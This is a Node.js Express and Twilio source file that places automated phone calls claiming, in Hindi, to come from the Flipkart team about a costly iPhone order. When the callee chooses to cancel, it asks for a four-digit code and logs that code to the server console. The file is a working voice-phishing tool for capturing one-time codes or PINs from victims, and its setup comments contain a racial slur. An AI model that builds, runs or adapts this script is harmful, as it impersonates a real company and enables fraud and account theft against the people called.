const express = require("express");
const bodyParser = require("body-parser");
const twilio = require("twilio");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

const accountSid = 'put your sid nigga';
const authToken = 'sale authtoken bhi to daal ';
const twilioNumber = 'number tera baap dalega or apna number nhi jo twilio se buy kara hai vo vala';

const client = twilio(accountSid, authToken);

// 1. Route to make a call
app.get("/call-user", (req, res) => {
  const toNumber = req.query.to;

  client.calls
    .create({
      to: toNumber,
      from: twilioNumber,
      url: "ngrok ka url padega idher or galti se ye / ke baad voice likha hai issko mat hata dena /voice"
    })
    .then(call => {
      res.send(`Calling ${toNumber}...`);
    })
    .catch(error => {
      console.error("Error placing call:", error);
      res.status(500).send("Failed to place call.");
    });
});

// 2. Voice response with improved speech
app.post("/voice", (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  const gather = twiml.gather({
    numDigits: 1,
    action: "/handle-choice",
    method: "POST"
  });

  gather.say(
    "नमस्ते, आप फ्लिपकार्ट टीम से बात कर रहे हैं। यह कॉल आपके ऑर्डर की पुष्टि के लिए है। "
    + "आपने आईफोन 16 प्रो मैक्स, 256 जीबी का ऑर्डर दिया है, जिसकी कीमत एक लाख चालीस हज़ार नौ सौ निन्यानवे रुपए है। "
    + "अगर आप ऑर्डर की पुष्टि करना चाहते हैं, तो 1 दबाएं। अगर ऑर्डर रद्द करना है, तो 2 दबाएं।",
    {
      language: "hi-IN",
      voice: "Polly.Aditi"
    }
  );

  res.type("text/xml");
  res.send(twiml.toString());
});

// 3. Handle 1 or 2
app.post("/handle-choice", (req, res) => {
  const digit = req.body.Digits;
  const twiml = new twilio.twiml.VoiceResponse();

  if (digit === "1") {
    twiml.say("आपका ऑर्डर कन्फर्म कर दिया गया है। धन्यवाद।", {
      language: "hi-IN",
      voice: "Polly.Aditi"
    });
  } else if (digit === "2") {
    const gather = twiml.gather({
      numDigits: 4,
      action: "/cancel-code",
      method: "POST",
      finishOnKey: "#"
    });
    gather.say("ऑर्डर रद्द करने के लिए, कृपया अपना चार अंकों का कोड दर्ज करें।", {
      language: "hi-IN",
      voice: "Polly.Aditi"
    });
  } else {
    twiml.say("गलत चयन। कृपया फिर से प्रयास करें।", {
      language: "hi-IN",
      voice: "Polly.Aditi"
    });
  }

  res.type("text/xml");
  res.send(twiml.toString());
});

// 4. Capture cancel code
app.post("/cancel-code", (req, res) => {
  const code = req.body.Digits;
  console.log("Cancel Code Entered:", code);

  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say("आपका ऑर्डर रद्द कर दिया गया है। धन्यवाद।", {
    language: "hi-IN",
    voice: "Polly.Aditi"
  });

  res.type("text/xml");
  res.send(twiml.toString());
});

// Start server
app.listen(5000, () => {
  console.log("Server running on http://localhost:5000");
});
